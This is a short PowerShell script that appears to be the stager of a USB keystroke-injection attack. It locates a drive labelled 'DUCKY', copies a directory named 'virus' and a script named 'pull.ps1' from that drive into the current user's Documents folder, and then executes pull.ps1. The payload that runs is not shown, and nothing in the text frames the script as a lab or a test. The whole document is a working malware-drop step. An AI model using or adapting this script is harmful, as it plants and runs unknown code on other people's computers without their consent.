
$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
$localUsername = $env:USERNAME
New-Item -Path "C:\Users\$localUsername\Documents" -Name 'virus' -ItemType "directory"
$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\*" -Recurse -Filter "pull.ps1"

$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\*" -Directory -Filter "virus"
$pathAfterCopy = "C:\Users\$localUsername\Documents\virus"

Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy\Virus
& "$pathAfterCopy\Virus\pull.ps1"